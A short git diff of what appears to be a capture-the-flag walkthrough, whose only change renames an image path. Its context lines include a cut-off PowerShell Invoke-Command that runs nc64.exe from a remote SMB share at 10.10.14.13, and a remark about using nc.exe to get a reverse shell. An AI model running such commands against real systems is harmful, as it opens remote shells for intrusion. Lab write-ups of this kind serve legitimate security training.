@@ -135,7 +135,7 @@ Invoke-Command -Computer localhost -ScriptBlock { \\10.10.14.13\share\nc64.exe -
 
 Now, we can execute `nc.exe` file to get another reverse shell and grab the user file.
 
-<figure><img src="../../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (160) (4).png" alt=""><figcaption></figcaption></figure>
 
 ### CHM
 
